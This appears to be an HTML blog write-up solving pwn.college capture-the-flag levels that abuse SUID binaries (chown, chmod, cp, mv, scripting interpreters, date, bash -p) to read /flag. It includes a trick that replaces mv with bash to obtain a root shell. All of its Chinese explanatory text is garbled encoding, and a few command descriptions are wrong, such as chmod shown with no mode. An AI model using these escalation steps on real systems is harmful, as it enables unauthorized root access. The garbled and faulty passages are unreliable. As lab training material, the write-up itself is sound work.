<p><strong>æ’å…¥æ–‡æœ¬</strong>ï¼šåœ¨æŒ‡å®šè¡Œä¹‹åæ’å…¥æ–‡æœ¬ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">a
text to insert
.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>æ·»åŠ æ–‡æœ¬</strong>ï¼šåœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ æ–‡æœ¬ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">a
text to append
.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>æ›¿æ¢æ–‡æœ¬</strong>ï¼šç”¨æ–°æ–‡æœ¬æ›¿æ¢æŒ‡å®šè¡Œçš„æ–‡æœ¬ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">s&#x2F;old&#x2F;new&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>åˆ é™¤è¡Œ</strong>ï¼šåˆ é™¤æŒ‡å®šè¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ˜¾ç¤ºè¡Œ</strong>ï¼šæ˜¾ç¤ºæŒ‡å®šè¡Œçš„å†…å®¹ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">p<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ç§»åŠ¨å…‰æ ‡</strong>ï¼šå°†å…‰æ ‡ç§»åŠ¨åˆ°æŒ‡å®šè¡Œã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">n<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä¿å­˜é€€å‡º</strong>ï¼šä¿å­˜ä¿®æ”¹å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">wq<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>é€€å‡ºä¸ä¿å­˜</strong>ï¼šæ”¾å¼ƒä¿®æ”¹å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ˜¾ç¤ºè¡Œå·</strong>ï¼šæ˜¾ç¤ºå½“å‰è¡Œå·ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ’å…¥å‘½ä»¤</strong>ï¼šåœ¨å½“å‰è¡Œä¹‹å‰æ’å…¥ä¸€è¡Œå‘½ä»¤ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">i
command
.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼šæ‰§è¡Œå½“å‰è¡Œçš„å‘½ä»¤ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>è¿™ç§ä¸å¸¸ç”¨</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level36:/challenge$ ed /flag
<span class="token number">57</span>
p
pwn.college<span class="token punctuation">&#123;</span>oSLjpurQyv2NRFJmvTLXN49oRUm.0FO3EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level37chown"><a class="markdownIt-Anchor" href="#level37chown"></a> level37(chown)</h3>
<p><code>chown</code> æ˜¯ä¸€ä¸ªç”¨äºæ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…çš„å‘½ä»¤ï¼Œå®ƒå¯ä»¥ä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„æ‰€æœ‰è€…å’Œæ‰€å±ç”¨æˆ·ç»„ã€‚ä»¥ä¸‹æ˜¯ä¸€äº› <code>chown</code> å‘½ä»¤çš„å¸¸ç”¨ç”¨æ³•ï¼š</p>
<ol>
<li>
<p><strong>æ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…</strong>ï¼šå°†æ–‡ä»¶çš„æ‰€æœ‰è€…æ›´æ”¹ä¸ºæŒ‡å®šçš„ç”¨æˆ·ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown username filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ›´æ”¹æ–‡ä»¶æ‰€æœ‰è€…å’Œæ‰€å±ç»„</strong>ï¼šå°†æ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€å±ç»„åŒæ—¶æ›´æ”¹ä¸ºæŒ‡å®šçš„ç”¨æˆ·å’Œç»„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown username:groupname filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ›´æ”¹ç›®å½•åŠå…¶å­ç›®å½•çš„æ‰€æœ‰è€…</strong>ï¼šä½¿ç”¨ <code>-R</code> é€‰é¡¹å¯ä»¥é€’å½’æ›´æ”¹ç›®å½•åŠå…¶å­ç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶çš„æ‰€æœ‰è€…ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown -R username directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨ UID å’Œ GID æ›´æ”¹æ‰€æœ‰è€…</strong>ï¼šå¯ä»¥ä½¿ç”¨ç”¨æˆ·çš„ UID å’Œç»„çš„ GID æ¥æŒ‡å®šæ‰€æœ‰è€…å’Œç»„ï¼Œè€Œä¸æ˜¯ç”¨æˆ·åå’Œç»„åã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown uid:gid filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä»…æ›´æ”¹æ–‡ä»¶çš„æ‰€å±ç»„</strong>ï¼šå¦‚æœçœç•¥äº†æ‰€æœ‰è€…éƒ¨åˆ†ï¼Œåˆ™åªæ›´æ”¹æ–‡ä»¶çš„æ‰€å±ç»„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown :groupname filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä»…æ›´æ”¹ç›®å½•çš„æ‰€æœ‰è€…ï¼Œä½†ä¸æ›´æ”¹å­ç›®å½•å’Œæ–‡ä»¶çš„æ‰€æœ‰è€…</strong>ï¼šå¯¹äºç›®å½•ï¼Œå¯ä»¥ä½¿ç”¨ <code>--reference</code> é€‰é¡¹ï¼Œå°†ä¸€ä¸ªç›®å½•çš„æ‰€æœ‰è€…å’Œç»„ä¿¡æ¯ä½œä¸ºå‚è€ƒï¼Œå¹¶åº”ç”¨åˆ°å¦ä¸€ä¸ªç›®å½•ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown --reference&#x3D;reference_file directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä»…æ›´æ”¹æ–‡ä»¶çš„æƒé™è€Œä¸æ›´æ”¹æ‰€æœ‰è€…</strong>ï¼šå¯ä»¥ä½¿ç”¨ <code>-v</code> é€‰é¡¹æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¯ä¸ªæ–‡ä»¶çš„æ›´æ”¹ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown -v username filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ›´æ”¹ç¬¦å·é“¾æ¥çš„æ‰€æœ‰è€…</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>chown</code> ä¸ä¼šæ›´æ”¹ç¬¦å·é“¾æ¥çš„æ‰€æœ‰è€…ï¼Œä½†å¯ä»¥ä½¿ç”¨ <code>-h</code> é€‰é¡¹æ¥æ›´æ”¹ç¬¦å·é“¾æ¥æœ¬èº«çš„æ‰€æœ‰è€…ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chown -h username symlink<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<p>è¿™äº›æ˜¯ <code>chown</code> å‘½ä»¤çš„ä¸€äº›å¸¸ç”¨ç”¨æ³•ï¼Œå¯ä»¥æ ¹æ®å…·ä½“çš„éœ€æ±‚é€‰æ‹©åˆé€‚çš„é€‰é¡¹å’Œå‚æ•°ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level37:/challenge$ <span class="token function">chown</span> <span class="token parameter variable">-c</span> hacker /flag
changed ownership of <span class="token string">'/flag'</span> from root to hacker
hacker@program-misuse~level37:/challenge$ <span class="token function">cat</span> /flag
pwn.college<span class="token punctuation">&#123;</span>8LnNaiS1CrzNHDD3_gzCrvxUFgY.0VO3EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level38chmod"><a class="markdownIt-Anchor" href="#level38chmod"></a> level38(chmod)</h3>
<p><code>chmod</code> æ˜¯ç”¨äºæ›´æ”¹æ–‡ä»¶æˆ–ç›®å½•æƒé™çš„å‘½ä»¤ã€‚å®ƒå¯ä»¥é€šè¿‡æŒ‡å®šæƒé™æ¨¡å¼æ¥ä¿®æ”¹æ–‡ä»¶çš„è¯»ã€å†™ã€æ‰§è¡Œæƒé™ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ç¬¦å·æˆ–æ•°å­—å½¢å¼æ¥è®¾ç½®æƒé™ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„ <code>chmod</code> å‘½ä»¤å’Œé€‰é¡¹ï¼š</p>
<ol>
<li>
<p><strong>åŸºæœ¬è¯­æ³•</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">chmod [options] mode file(s)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è®¾ç½®æƒé™</strong>ï¼šé€šè¿‡æ•°å­—å½¢å¼è®¾ç½®æƒé™ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 755 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ç¬¦å·å½¢å¼è®¾ç½®æƒé™</strong>ï¼š</p>
<ul>
<li><code>u</code>ï¼šæ–‡ä»¶æ‰€æœ‰è€…</li>
<li><code>g</code>ï¼šæ–‡ä»¶æ‰€å±ç»„</li>
<li><code>o</code>ï¼šå…¶ä»–ç”¨æˆ·</li>
<li><code>a</code>ï¼šæ‰€æœ‰ç”¨æˆ·</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">chmod u+x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>é€’å½’è®¾ç½®æƒé™</strong>ï¼šé€šè¿‡ <code>-R</code> é€‰é¡¹é€’å½’åœ°æ›´æ”¹ç›®å½•åŠå…¶å­ç›®å½•çš„æƒé™ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chmod -R 755 directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>èµ‹äºˆæ‰€æœ‰æƒé™</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">chmod 777 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>å–æ¶ˆç‰¹å®šæƒé™</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">chmod a-x file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä½¿æ–‡ä»¶å¯æ‰§è¡Œ</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">chmod +x script.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>è®¾ç½®ç‰¹æ®Šæƒé™</strong>ï¼š</p>
<ul>
<li><code>setuid</code>ï¼ˆSUIDï¼‰ï¼šå°†æ–‡ä»¶çš„æ‰§è¡Œæƒé™è®¾ç½®ä¸ºæ‰€æœ‰è€…çš„æƒé™ã€‚</li>
<li><code>setgid</code>ï¼ˆSGIDï¼‰ï¼šå°†æ–‡ä»¶çš„æ‰§è¡Œæƒé™è®¾ç½®ä¸ºç»„çš„æƒé™ã€‚</li>
<li><code>sticky</code>ï¼šè®¾ç½®ç›®å½•çš„ç²˜æ»ä½ï¼Œé˜²æ­¢å…¶ä»–ç”¨æˆ·åˆ é™¤éè‡ªå·±çš„æ–‡ä»¶ã€‚</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">chmod u+s file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ•°å­—å½¢å¼è®¾ç½®æƒé™</strong>ï¼š</p>
<ul>
<li><code>4</code>ï¼šè¯»æƒé™</li>
<li><code>2</code>ï¼šå†™æƒé™</li>
<li><code>1</code>ï¼šæ‰§è¡Œæƒé™</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">chmod 644 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</strong>ï¼šé€šè¿‡ <code>-v</code> é€‰é¡¹æ˜¾ç¤ºæ“ä½œçš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">chmod -v 755 file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>ä½¿ç”¨ç»å¯¹è·¯å¾„è®¾ç½®æƒé™</strong>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">chmod &#x2F;path&#x2F;to&#x2F;file.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level38<span class="token punctuation">)</span> every <span class="token function">time</span> that you restart
this challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/chmod<span class="token operator">!</span>
hacker@program-misuse~level38:/challenge$ <span class="token function">chmod</span> <span class="token number">777</span> /flag
hacker@program-misuse~level38:/challenge$ <span class="token function">cat</span> /flag 
pwn.college<span class="token punctuation">&#123;</span>QI1o6TWY0HyOp6UWUMrgD7oKFaf.0FM4EDLzczN0UzW<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level39cp"><a class="markdownIt-Anchor" href="#level39cp"></a> level39(cp)</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level39:/challenge$ <span class="token function">touch</span> myflag
touch: cannot <span class="token function">touch</span> <span class="token string">'myflag'</span><span class="token builtin class-name">:</span> Permission denied
hacker@program-misuse~level39:/challenge$ <span class="token function">touch</span> myflag.txt
touch: cannot <span class="token function">touch</span> <span class="token string">'myflag.txt'</span><span class="token builtin class-name">:</span> Permission denied
hacker@program-misuse~level39:/challenge$ <span class="token builtin class-name">cd</span> ~
hacker@program-misuse~level39:~$ <span class="token function">ls</span>
Desktop  leap  myflag
hacker@program-misuse~level39:~$ <span class="token function">cp</span> /flag ~/myflag
hacker@program-misuse~level39:~$ <span class="token function">cat</span> myflag 
pwn.college<span class="token punctuation">&#123;</span>Qk-mBYdB47xVyCjxSB0xC1SUaIZ.0VM4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æˆ–è€…è¯´å¯ä»¥è¿™æ ·å†™</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /flag /dev/stdout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level40mv"><a class="markdownIt-Anchor" href="#level40mv"></a> level40(mv)</h3>
<p>ä½¿ç”¨ <code> </code>mv<code> </code> å‘½ä»¤æ— æ³•åœ¨ä¸æ”¹å˜æ–‡ä»¶å±æ€§çš„æƒ…å†µä¸‹ç§»åŠ¨æ–‡ä»¶</p>
<p>æƒ³äº†åŠå°æ—¶æƒ³ä¸å‡ºå¦‚ä½•ç»•è¿‡</p>
<ul>
<li>æ€è·¯1</li>
</ul>
<p>çœ‹äº†githubä¸€ä½è€å“¥çš„å†™æ³•ï¼›å¾ˆç¥å¥‡</p>
<p>å°±æ˜¯å°†å…ˆå°† <code>flag</code>æ–‡ä»¶ç§»åŠ¨åˆ° å½“å‰ç”¨æˆ·ç›®å½•ä¸‹,è™½ç„¶æ–‡ä»¶å±æ€§æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œä½†æ˜¯å¹³å°å¯ä»¥ä¿ç•™è¿™ä¸ªç›®å½•æ–‡ä»¶åˆ°å…¶ä»–å…³å¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹‹é—´åˆ°catæœ‰suidä¸‹çš„å…³å¡å°±å¯ä»¥ç›´æ¥è¯»äº†</p>
<ul>
<li>
<p>æ€è·¯2</p>
<p>é€šè¿‡ç§»åŠ¨å°† mvçš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºbashçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç„¶åè¿è¡Œåˆ¤é¢˜ç¨‹åºï¼Œé‚£ä¹ˆbashå°±æœ‰çš„suidæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æœ‰äº†rootæƒé™</p>
<p>ä»è€ŒææƒæˆåŠŸ</p>
</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level40:/challenge$ ./babysuid_level40 <span class="token operator">&amp;&amp;</span><span class="token function">mv</span> /usr/bin/bash /usr/bin/mv<span class="token operator">&amp;&amp;</span> ./babysuid_level40 <span class="token operator">&amp;&amp;</span><span class="token function">mv</span> <span class="token parameter variable">-p</span>
Welcome to ./babysuid_level40<span class="token operator">!</span>

This challenge is part of a series of programs that
<span class="token builtin class-name">let</span> you get the flag by doing tricks with permissions.

I just <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv.
Try to use it to <span class="token builtin class-name">read</span> the flag<span class="token operator">!</span>

IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level40<span class="token punctuation">)</span> every <span class="token function">time</span> that you restart
this challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv<span class="token operator">!</span>
Welcome to ./babysuid_level40<span class="token operator">!</span>

This challenge is part of a series of programs that
<span class="token builtin class-name">let</span> you get the flag by doing tricks with permissions.

I just <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv.
Try to use it to <span class="token builtin class-name">read</span> the flag<span class="token operator">!</span>

IMPORTANT: <span class="token function">make</span> sure to run me <span class="token punctuation">(</span>./babysuid_level40<span class="token punctuation">)</span> every <span class="token function">time</span> that you restart
this challenge container to <span class="token function">make</span> sure that I <span class="token builtin class-name">set</span> the SUID bit on /usr/bin/mv<span class="token operator">!</span>
mv-5.0<span class="token comment"># cat /flag</span>
pwn.college<span class="token punctuation">&#123;</span>wni-KDP3s-n97BB2eWOTe5wUl5i.0lM4EDLzczN0UzW<span class="token punctuation">&#125;</span>
mv-5.0<span class="token comment"># </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level41perl"><a class="markdownIt-Anchor" href="#level41perl"></a> level41(perl)</h3>
<p><code>Perl</code> is a high-level, versatile programming language know for its powerful text processing capabilities. It was created by <code>Lary Wall</code> in the late <code>1980s</code>.</p>
<p>æˆ‘ä»¬éœ€è¦ç”¨perlè¯­è¨€æ¥è¯»å–<code>/flag</code></p>
<p>æ‹·é—®gpt</p>
<pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token comment">#!/usr/bin/perl</span>

<span class="token keyword">use</span> strict<span class="token punctuation">;</span>
<span class="token keyword">use</span> warnings<span class="token punctuation">;</span>

<span class="token comment"># æ‰“å¼€æ–‡ä»¶</span>
open<span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token keyword">die</span> <span class="token string">"æ— æ³•æ‰“å¼€æ–‡ä»¶ '/flag' $!"</span><span class="token punctuation">;</span>

<span class="token comment"># è¯»å–æ–‡ä»¶å†…å®¹å¹¶æ‰“å°åˆ°æ ‡å‡†è¾“å‡º</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token keyword">my</span> <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token operator">&lt;</span><span class="token variable">$fh</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">print</span> <span class="token variable">$line</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment"># å…³é—­æ–‡ä»¶</span>
close<span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level41:~/demo$ <span class="token function">vim</span> perl.pl
hacker@program-misuse~level41:~/demo$ perl perl.pl 
pwn.college<span class="token punctuation">&#123;</span>E3xT7qLwd2jI9Ev6oHUdWFb4v-Z.01M4EDLzczN0UzW<span class="token punctuation">&#125;</span>
hacker@program-misuse~level41:~/demo$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level42python"><a class="markdownIt-Anchor" href="#level42python"></a> level42(python)</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level42:/challenge$ <span class="token builtin class-name">cd</span> ~/demo/
hacker@program-misuse~level42:~/demo$ <span class="token function">vim</span> program_misuse_level42.py
hacker@program-misuse~level42:~/demo$ python program_misuse_level42.py 
pwn.college<span class="token punctuation">&#123;</span>InEQ92_mJH6ItEQoBai78E2l2Mj.0FN4EDLzczN0UzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æ‰“å¼€æ–‡ä»¶</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token comment"># è¯»å–æ–‡ä»¶å†…å®¹</span>
    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># æ‰“å°æ–‡ä»¶å†…å®¹</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="level43ruby"><a class="markdownIt-Anchor" href="#level43ruby"></a> level43(ruby)</h3>
<p>ä¸ä¼šrubyï¼Œæ‹·æ‰“gpt</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># æ‰“å¼€æ–‡ä»¶</span>
file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/flag'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'r'</span></span><span class="token punctuation">)</span>

<span class="token comment"># è¯»å–æ–‡ä»¶å†…å®¹</span>
content <span class="token operator">=</span> file<span class="token punctuation">.</span>read

<span class="token comment"># è¾“å‡ºæ–‡ä»¶å†…å®¹</span>
puts content

<span class="token comment"># å…³é—­æ–‡ä»¶</span>
file<span class="token punctuation">.</span>close
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ruby level43.ruby<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="level44bash"><a class="markdownIt-Anchor" href="#level44bash"></a> level44(bash)</h3>
<ul>
<li>å†™bashè„šæœ¬</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token punctuation">;</span> 
<span class="token keyword">do</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span><span class="token punctuation">;</span>
<span class="token keyword">done</span> <span class="token operator">&lt;</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>å‘ç°æ²¡æœ‰æƒé™è¯»å–</p>
<p>å®é™…ä¸Šå‘ç”Ÿçš„æƒ…å†µæ˜¯ï¼Œç”±äºæˆ‘ä»¬å·²ç»è®¾ç½®äº† <code>SUID</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­£åœ¨åƒ <code>bash</code> é‚£æ ·æ‰§è¡Œ <code>pseudo-root</code> ï¼Œä½†å½“ <code>bash</code> å‘ç°æˆ‘ä»¬å¹¶ä¸æ˜¯çœŸæ­£çš„ <code>root</code> ï¼Œè€Œæ˜¯åœ¨æ‰®æ¼” <code>root</code> çš„è§’è‰²æ—¶ï¼Œå®ƒä¼šå–æ¶ˆæˆ‘ä»¬åœ¨ <code>SUIDing</code>  <code>bash</code> æ—¶è·å¾—çš„ç‰¹æƒã€‚è¿™ç§åšæ³•è¢«ç§°ä¸º <code>mitigation</code> ï¼Œå®ƒå¯ä»¥å‡å°‘ <code>command injection</code> é€ æˆçš„ä¼¤å®³ï¼Œå› ä¸ºå¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ <code>command injection vulnerabilities end up hijacking /bin/sh</code> ã€‚</p>
<p>To disable <code>mitigation</code> , <code>bash -p [command]</code> is used.è¦ç¦ç”¨ <code>mitigation</code> ï¼Œå¯ä»¥ä½¿ç”¨ <code>bash -p [command]</code> ç›´æ¥è®¾ç½®ä¸ºç‰¹æƒæ¨¡å¼</p>
<p>æ‰€ä»¥ç›´æ¥ä½¿ç”¨ <code>bash -p /flag</code></p>
<h3 id="level45date"><a class="markdownIt-Anchor" href="#level45date"></a> level45(date)</h3>
<p>dateï¼ŒåŸæ¥çš„ä½œç”¨æ˜¯æ˜¾ç¤ºå½“å‰æ—¶é—´æˆ–è€…å°†æ—¶é—´æŒ‰æ ¼å¼è¾“å‡ºï¼Œä½†æ˜¯ç”¨<code>-f</code>å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å†…å®¹ä¸æ˜¯æ­£å¸¸çš„æ—¥æœŸï¼Œåˆ™ä¼šå›æ˜¾å‡ºæ¥ã€‚</p>
<p><code>date -f /flag</code></p>
<h3 id="level46dmesg"><a class="markdownIt-Anchor" href="#level46dmesg"></a> level46(dmesg)</h3>
<p><code>dmesg</code>ï¼ˆ&quot;display message&quot;çš„ç¼©å†™ï¼‰å‘½ä»¤ç”¨äºæ˜¾ç¤ºLinuxå†…æ ¸ç¯ç¼“å†²åŒºä¸­çš„æ¶ˆæ¯ã€‚å®ƒæä¾›äº†ä¸€ä¸ªæŸ¥çœ‹ç³»ç»Ÿå¼•å¯¼è¿‡ç¨‹ä¸­å‘ç”Ÿçš„äº‹ä»¶å’Œé”™è¯¯çš„é€”å¾„ï¼Œä»¥åŠä¸è®¾å¤‡ã€é©±åŠ¨ç¨‹åºå’Œå…¶ä»–å†…æ ¸ç»„ä»¶ç›¸å…³çš„ä¿¡æ¯ã€‚</p>
<p>åŸºæœ¬ç”¨æ³•ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">dmesg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
